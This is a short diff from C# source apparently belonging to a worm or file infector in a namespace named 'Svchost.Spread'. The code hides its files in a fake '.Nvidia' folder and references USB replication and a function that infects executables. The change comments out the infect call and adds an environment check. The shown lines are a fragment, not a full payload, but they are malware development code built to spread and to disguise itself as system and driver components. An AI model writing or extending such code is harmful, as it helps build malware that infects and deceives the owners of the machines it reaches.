@@ -37,11 +37,12 @@ namespace Svchost.Spread
             targetFolder = "C:\\Users\\" + windowsName + "\\.Nvidia\\";
             usbFolderName = "Music\\";
 
+            checkEnvironment();
             /*
             if (checkEnvironment())
                 driveDetector = new DriveDetector(applicationPath + assemblyName, replicateOverUSB);*/
 
-            infect(applicationPath);
+            //infect(applicationPath);
         }
 
         private bool isExecutableInfected(string path)
